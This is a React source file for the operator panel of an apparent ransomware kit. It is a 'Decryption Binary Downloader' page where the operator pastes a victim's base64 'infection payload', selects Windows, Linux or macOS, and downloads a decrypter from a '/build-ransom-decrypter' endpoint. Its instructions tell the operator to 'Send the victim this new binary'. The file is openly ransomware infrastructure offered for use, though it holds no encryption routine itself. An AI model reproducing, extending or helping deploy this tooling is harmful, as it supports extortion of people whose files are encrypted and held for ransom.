import React, { useState } from "react";

import { Layout } from "../Layout";
import md5 from "md5";

export function DecryptPage(): JSX.Element {
  const [textAreaValue, setTextAreaValue] = useState("");
  const [selectedOs, setSelectedOs] = useState<string>("win");

  const isDisabled = textAreaValue.length === 0;

  function generateDecrypterBinaryUrlLink() {
    const params = new URLSearchParams();
    params.append("payload", textAreaValue);
    params.append("os", selectedOs);

    return `/build-ransom-decrypter?${params.toString()}`;
  }

  const osToFileExt = (os: string): string =>
    ({ win: ".exe", linux: "", macos: "" }[os]!);

  function generateDecrypterBinaryFileName() {
    return (
      `decrypter-` +
      md5(textAreaValue) +
      "-" +
      selectedOs +
      osToFileExt(selectedOs)
    );
  }

  return (
    <Layout>
      <h1 style={{ textAlign: "center" }}>
        <span style={{ color: "#a5a5a5" }}>De</span>cryption Binary Downloader
      </h1>
      <textarea
        autoFocus
        value={textAreaValue}
        onChange={(e) => setTextAreaValue(e.target.value)}
        name="infections-payload"
        id="infections-payload"
        cols={30}
        rows={20}
        style={{
          width: "100%",
        }}
      ></textarea>
      <br />
      <br />
      <a
        href={isDisabled ? "#" : generateDecrypterBinaryUrlLink()}
        download={generateDecrypterBinaryFileName()}
      >
        {generateDecrypterBinaryFileName()}
      </a>
      <span style={{ padding: "0.2rem" }}></span>
      <select
        name="os"
        id="os"
        onChange={(e) => {
          setSelectedOs(e.target.options[e.target.selectedIndex].value);
        }}
      >
        <option value="win">.exe</option>
        <option value="linux">.deb</option>
        <option value="macos">.dmg</option>
      </select>
      <br />
      <br />
      <ul>
        <li>0. Paste the infection payload in the text area above.</li>
        <li>
          1. Click in the{" "}
          <a
            href={isDisabled ? "#" : generateDecrypterBinaryUrlLink()}
            download={generateDecrypterBinaryFileName()}
          >
            download
          </a>{" "}
          link.
        </li>
        <li>2. Send the victim this new binary.</li>
      </ul>
      <hr />
      <h4>Where does this payload come from?</h4>
      The victim must send you this infection payload. The payload is a simple
      multi-line base64 encoded string, it contains the required data for
      decryption and full restoration of their files.
      <br />
      <br />
      <hr />
      Be aware that decrypter binaries are safe to run in any machine.
    </Layout>
  );
}
